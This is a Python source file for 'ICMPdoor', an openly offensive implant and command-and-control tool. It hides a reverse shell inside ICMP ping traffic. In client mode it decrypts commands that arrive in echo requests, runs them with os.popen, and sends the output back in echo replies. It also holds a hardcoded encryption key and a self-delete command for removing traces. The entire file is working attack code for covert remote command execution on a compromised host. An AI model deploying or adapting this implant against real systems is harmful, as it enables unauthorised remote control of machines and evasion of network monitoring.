#!/usr/bin/env python3

import argparse
import base64
import os
import sys
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from multiprocessing import Process
from scapy.all import ICMP, IP, Raw, sniff, sr

"""
ICMPdoor (IMCP reverse shell) [implant]
By krabelize | cryptsus.com
More info: https://cryptsus.com/blog/icmp-reverse-shell.html
"""

class Icmpdoor():
    __slots__ = ('DIP', 'ICMP_ID', 'OTP', 'TTL', 'clientIP', 'serverIP', 'svr')
    def __init__(self, args):
        """A class for tracking and encrypting the shell"""
        self.clientIP = '192.168.0.100'                                         ## CHANGE ME PROBABLY
        self.serverIP = '192.168.0.101'                                         ## CHANGE ME PROBABLY
        self.OTP = Fernet(b'qr0qsfv7AXgw0Iwh4lQ31wZGadH2dZTpqoFydU7wAZw=')      ## CHANGE ME MAYBE
        self.ICMP_ID = 13170                                                    ## CHANGE ME MAYBE
        self.TTL = 64                                                           ## CHANGE ME MAYBE
        if args.mode == 'server':
            self.svr = self.serverShell()

    def LFILTERc(self, type):
        """ICMP type filtering"""
        def snarf(pkt):
            if pkt[IP].src == self.serverIP:
                if pkt[ICMP].type == type:
                    if pkt[ICMP].id == idr.ICMP_ID:
                        if pkt[Raw].load:
                            return True
        return snarf


    def LFILTERs(self, type):
        """ICMP type filtering"""
        def snarf(pkt):
            if pkt[IP].src == self.clientIP:
                if pkt[ICMP].type == type:
                    if pkt[ICMP].id == idr.ICMP_ID:
                        if pkt[Raw].load:
                            return True
        return snarf

    def clientShell(self):
        """prn in sniff()"""
        def snarf(pkt):
            icmppaket = self.OTP.decrypt((pkt[Raw].load).decode('utf-8',
                                                                errors = 'ignore'))
            action = icmppaket.decode()
            if action == '___otp___':
                if os.path.basename(__file__) == 'otp.py':
                    os.remove('otp.py')
                sys.exit(0)
            else:
                payload = os.popen(action).readlines()
            try:
                OTP = self.OTP.encrypt('___42___'.join(payload).encode('utf-8'))
                icmppacket = (IP(dst = self.serverIP, ttl = self.TTL)/\
                              ICMP(type = 0, id = idr.ICMP_ID)/\
                              Raw(load = OTP))
                sr(icmppacket, timeout = 0, verbose = 0)
            except Exception as E:
                print(E)
        return snarf

    def otpGen(self, password):
        """Generate a new key"""
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=480000,
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))

    def serverShell(self):
        """Show the output from the client"""
        def snarf(pkt):
            try:
                print(self.OTP.decrypt(pkt[Raw].load).decode().replace('___42___', ''))
            except Exception as E:
                print(E)
        return snarf

    def serverSniff(self):
        """Sniff for the return output from the client"""
        if args.interface is None:
            sniff(prn = self.svr,
                  lfilter = idr.LFILTERs,
                  filter = 'icmp',
                  store = 0)
        else:
            sniff(iface = args.interface,
                  prn = self.svr,
                  lfilter = idr.LFILTERs,
                  filter = 'icmp',
                  store = 0)

if __name__ == '__main__':

    ## Env
    parser = argparse.ArgumentParser()
    parser.add_argument('-g', '--generate_key',
                        action = 'store_true',
                        help = 'Generate an encryption key')
    parser.add_argument('-i', '--interface',
                        help = '(Virtual) Network Interface (e.g. eth0)')
    parser.add_argument('-m', '--mode',
                        choices = ['server', 'client'],
                        help = 'server or client mode (client mode is default)')
    args = parser.parse_args()
    idr = Icmpdoor(args)

    if args.generate_key is not False:
        print(idr.otpGen(input('Password?\n')))
    else:

        ## Client mode
        if args.mode is None or args.mode == 'client':
            PRN = idr.clientShell()
            LFILTER = idr.LFILTERc(8)
            print("[+]ICMP listener starting!")

            if args.interface is None:
                sniff(prn = PRN,
                      lfilter = LFILTER,
                      filter = 'icmp',
                      store = 0)
            else:
                sniff(iface = args.interface,
                      prn = PRN,
                      lfilter = LFILTER,
                      filter = 'icmp',
                      store = 0)

        ## Server mode
        else:
            sniffing = Process(target = idr.serverSniff)
            sniffing.start()
            LFILTER = idr.LFILTERs(0)
            print("[+]ICMP C2 started!")
            while True:
                icmpshell = input("shell: ")
                if icmpshell == 'exit':
                    print("[+]Stopping ICMP C2...")
                    sniffing.terminate()
                    break
                elif icmpshell == '':
                    pass
                else:
                    payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
                               ICMP(type = 8, id = idr.ICMP_ID)/\
                               Raw(load = idr.OTP.encrypt(icmpshell.encode())))
                    sr(payload, timeout = 0, verbose = 0)
                if icmpshell == '___otp___':
                    print("[+]Deleting ICMP C2...")
                    time.sleep(2)
                    sniffing.terminate()
                    break
            sniffing.join()
